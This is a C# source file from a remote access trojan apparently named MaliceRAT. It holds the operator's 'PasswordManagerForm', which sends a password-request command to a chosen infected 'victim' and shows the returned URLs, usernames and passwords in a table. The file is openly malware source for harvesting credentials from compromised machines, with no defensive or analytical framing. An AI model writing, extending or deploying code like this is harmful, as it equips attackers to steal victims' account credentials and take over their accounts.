using System;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Web.Script.Serialization;
using MaliceRAT.RatServer;

namespace MaliceRAT.RatUI
{
    public class CredentialModel
    {
        public string Url { get; set; }
        public string Username { get; set; }
        public string Password { get; set; }
    }

    public partial class PasswordManagerForm : Form
    {
        #region Variables
        private readonly int id;
        private readonly Server server;
        #endregion

        #region Constructor
        public PasswordManagerForm(int id, Server server)
        {
            InitializeComponent();
            this.id = id;
            this.server = server;

            server.GetVictimById(id).Send(new { type = "request_passswords" });
            server.MessageReceived += Server_MessageReceived;
        }

        private void Server_MessageReceived(Victim victim, dynamic message)
        {
            if (victim.Id == id)
            {
                if (message["type"] == "passwords")
                {
                    var passwords = new JavaScriptSerializer().Deserialize<List<CredentialModel>>(message["data"].ToString());
                    Console.WriteLine(passwords.Count);
                    gunaPasswordsTable.Invoke((MethodInvoker)delegate {
                        gunaPasswordsTable.Rows.Clear();
                        foreach (var password in passwords)
                        {
                            gunaPasswordsTable.Rows.Add(password.Url, password.Username, password.Password);
                        }
                    });
                }
            }
        }
        #endregion
    }
}